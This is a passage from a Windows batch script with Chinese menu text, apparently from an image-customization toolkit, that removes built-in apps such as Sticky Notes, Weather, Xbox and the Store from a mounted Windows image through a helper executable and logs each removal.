	call :RemoveWindowsComponent "Mount", "便笺应用", "StickyNotes"
	call :RemoveWindowsComponent "Mount", "使用技巧应用", "Getstarted"
	call :RemoveWindowsComponent "Mount", "录音机应用", "SoundRecorder"
	call :RemoveWindowsComponent "Mount", "天气应用", "BingWeather"
	call :RemoveWindowsComponent "Mount", "Web 媒体扩展插件", "WebMediaExtensions"
	call :RemoveWindowsComponent "Mount", "Webp 图像扩展插件", "WebpImageExtensions"
	call :RemoveWindowsComponent "Mount", "Windows 邮件应用", "CommunicationsApps"
	call :RemoveWindowsComponent "Mount", "Windows 应用商店应用", "WindowsStore"
	call :RemoveWindowsComponent "Mount", "Xbox 应用", "XboxApp"
	if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Xbox Identity Provider", "XboxIdentityProvider"
	call :RemoveWindowsComponent "Mount", "你的手机应用", "YourPhone"
)

if "!Component!" equ "MultimediaComponents" set "goto=:RemoveMenu"
if "!Component!" equ "PrivacyComponents" set "goto=:RemoveMenu"
if "!Component!" equ "RemotingComponents" set "goto=:RemoveMenu"
if "!Component!" equ "SystemComponents" set "goto=:RemoveMenu"
if "!Component!" equ "SystemApps1" set "goto=:RemoveSystemAppsMenu"
if "!Component!" equ "SystemApps2" set "goto=:RemoveSystemAppsMenu"
if "!Component!" equ "WindowsApps1" set "goto=:RemoveWindowsAppsMenu"
if "!Component!" equ "WindowsApps2" set "goto=:RemoveWindowsAppsMenu"
cls&echo.&echo.移除所选项目已完成，请按任意键返回...&pause>nul&set "Item="&set "Component="&goto !goto!

:RemoveWindowsComponent
cls&echo.&echo.正在移除 %2 请稍等...
set "Item=移除 %2"
"!ToolsPath!\ToolKitHelper.exe" %1 %3
call :Log
goto :eof
